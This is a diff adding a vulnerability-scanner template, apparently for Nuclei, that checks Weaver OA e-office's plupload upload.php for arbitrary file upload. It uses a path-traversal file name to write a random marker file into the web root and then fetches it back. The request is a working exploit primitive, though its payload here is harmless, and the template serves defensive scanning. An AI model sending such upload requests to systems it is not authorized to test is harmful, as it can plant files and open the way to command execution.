@@ -1,0 +1,40 @@
+id: weaver-oa-eoffice-upload-file-upload
+info:
+  name: Weaver OA e-office Arbitrary File Upload
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Weaver OA e-office upload.php file upload vulnerability allows attackers to upload malicious files, potentially resulting in command execution on the system.
+  tags: file-upload, vulnerability
+
+variables:
+  random_filename: '{{rand_base(6)}}'
+  random_check: '{{rand_base(20)}}'
+
+http:
+  - raw:
+      - |
+        POST /newplugins/js/plupload-2.1.1/examples/upload.php?name=../../webroot/{{random_filename}}.txt HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/plain
+        Content-Length: {{len(random_check)}}
+
+        {{random_check}}
+    matchers:
+      - type: status
+        status:
+          - 200
+
+  - raw:
+      - |
+        GET /{{random_filename}}.txt HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - '{{random_check}}'
+        part: body
